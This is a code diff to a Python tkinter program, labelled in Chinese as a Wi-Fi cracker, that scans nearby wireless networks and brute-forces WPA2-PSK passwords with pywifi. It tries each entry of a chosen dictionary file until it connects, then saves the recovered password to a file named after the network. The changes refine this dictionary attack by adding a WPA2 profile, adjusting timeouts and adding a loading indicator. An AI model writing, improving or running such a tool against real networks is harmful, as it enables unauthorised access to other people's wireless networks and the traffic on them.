@@ -10,6 +10,8 @@ import ctypes
 from tkinter import *
 from tkinter.ttk import Treeview
 from tkinter.ttk import Progressbar
+
+import pywifi
 from pywifi import *
 import time
 import threading
@@ -20,11 +22,12 @@ import tkinter.messagebox
 class Watchdog():
     def __init__(self):
         self.root = Tk()
-        self.root.title('WiFi爆破')
+        self.root.title('Wi-Fi破解')
         self.root.wm_attributes('-topmost', 1)
-        self.root.geometry('820x400')
+        self.root.geometry('820x400+300+200')
         self.root.maxsize(800, 350)
         self.root.minsize(800, 350)
+        self.root.iconbitmap('2.ico')
         self.list = []
         self.MODES = [
             ("top10", 'top10.txt', 0),
@@ -70,6 +73,9 @@ class Watchdog():
         self.tree.bind('<ButtonRelease-1>', self.selectItem)
         self.tree.pack(fill=X, padx=5, pady=10)
 
+        self.loading_val = StringVar()
+        self.loading_text = Label(self.frm, textvariable = self.loading_val, padx=10, pady=5, font = '微软雅黑 -15')
+
         self.scan_button = Button(self.frm_R, text='扫描WiFi', command=self.thread_a)
         self.scan_button.pack(fill=X, padx=5, pady=10, ipadx=8, ipady=5)
 
@@ -101,7 +107,8 @@ class Watchdog():
             exit()
         if len(wifi.interfaces()) == 1:
             # self.message_box('搜索到网卡设备 %s' % (wifi.interfaces()[0].name()))
-            return wifi.interfaces()[0]
+            iface = wifi.interfaces()[0]
+            return iface
         else:
             print ('%-4s   %s' % ('No', 'interface name'))
             for i, w in enumerate(wifi.interfaces()):
@@ -125,7 +132,7 @@ class Watchdog():
         if new_filename != '':
             self.filename = new_filename
 
-    def attack_wifi(self,timeout=10):
+    def attack_wifi(self,timeout=8):
         if self.break_flag == True:
             tkinter.messagebox.showinfo('提示', '正在攻击，请先终止攻击')
             return
@@ -139,10 +146,6 @@ class Watchdog():
             tkinter.messagebox.showinfo('提示', '请选择爆破用字典文件')
             return
         # 读取txt
-        key_index = 0
-        time_former=time.time()
-        time_now=time.time()-time_former
-        code=-1
         with open(self.filename, 'r')as f:
             keys = f.readlines()
         target=None
@@ -152,36 +155,49 @@ class Watchdog():
                 break
         self.break_flag = True
         if target!=None:
+            key_index = 0
+            profile = pywifi.Profile()
+            profile.ssid = target.ssid.strip()
+            profile.auth = const.AUTH_ALG_OPEN
+            profile.akm.append(const.AKM_TYPE_WPA2PSK)
+            profile.cipher = const.CIPHER_TYPE_CCMP
             while key_index<len(keys) and self.break_flag:
-                key=keys[key_index]
-                self.prograss_num.set((key_index+1)*100/len(keys))
-                target.key=key.strip()
-                # self.dic_var.set('当前正在尝试密码%s'%key.strip())
+                key = keys[key_index]
+                profile.key = key.strip()
+                self.prograss_num.set((key_index + 1) * 100 / len(keys))
+                # self.iface.remove_all_network_profiles()
                 self.iface.disconnect()
-                self.iface.connect(self.iface.add_network_profile(target))
-                while 1:
+                self.iface.connect(self.iface.add_network_profile(profile))
+                code = -1
+                pre_time = time.time()
+                now_time = time.time() - pre_time
+                # self.dic_var.set('当前正在尝试密码%s'%key.strip())
+                # print(target.ssid)
+                while True:
                     self.root.update()
                     time.sleep(0.1)
                     code=self.iface.status()
-                    time_now=time.time()-time_former
-                    if time_now>timeout:
+                    now_time=time.time()-pre_time
+                    if code == const.IFACE_DISCONNECTED or now_time>timeout:
                         break
-                    if code == const.IFACE_DISCONNECTED:
-                        break
+                    # if code == const.IFACE_DISCONNECTED:
+                    #     break
                     elif code == const.IFACE_CONNECTED:
-                        tkinter.messagebox.showinfo('提示', '密码爆破成功，密码为%s'% key)
-                        f=open(x.ssid,'w+')
+                        tkinter.messagebox.showinfo('提示', '密码破解成功，密码为%s'% key)
+                        self.break_flag = False
+                        f=open(x.ssid, 'w+')
                         f.write(key)
                         f.close()
                         return
-                if code == const.IFACE_DISCONNECTED and time_now < 1:
-                    time.sleep(10)
+                if code == const.IFACE_DISCONNECTED and now_time<1:
+                    time.sleep(8)
                     continue
                 key_index=key_index+1
+                time_former = time.time()
             if self.break_flag:
-                tkinter.messagebox.showinfo('提示', '密码爆破失败')
+                tkinter.messagebox.showinfo('提示', '密码破解失败，请尝试其它密码字典')
             else:
-                tkinter.messagebox.showinfo('提示', '已经终止爆破')
+                tkinter.messagebox.showinfo('提示', '已经终止破解')
         else:
             tkinter.messagebox.showinfo('提示', '选择的wifi已丢失')
         self.break_flag = False
@@ -190,12 +206,26 @@ class Watchdog():
         rad_file = self.radio_val.get()
         self.filename = './'+rad_file
         print(self.filename)
+
+    def scan_loading(self):
+        self.loading_text.place(x=250, y=170)
+        self.loading_val.set("Loading.    ")
+        text = ["Loading.    ", "Loading..   ", "Loading...  "]
+        index = 0
+        while self.is_loading:
+            time.sleep(0.5)
+            self.loading_val.set(text[index%3])
+            index = index+1
+        self.loading_text.place_forget()
     def scan_wifi(self):
         #清空列表
         items=self.tree.get_children()
         for item in items:
             self.tree.delete(item)
 
+        self.is_loading = True
+        t = threading.Thread(target=self.scan_loading)
+        t.start()
         self.iface = self.get_wifi_interface()
         self.ap_list = {}
         self.ap_mac = None
@@ -214,6 +244,7 @@ class Watchdog():
                 if len(x.akm) > 0:  # if len(x.akm)==0 ,the auth is OPEN
                     self.ap_list[x.bssid] = x
             self.tree.insert('', 'end', values=[i + 1, ssid, x.bssid, x.signal, self.get_akm_name(x.akm)])
+        self.is_loading = False
 
     def get_akm_name(self, akm_value):
         # 获取加密类型
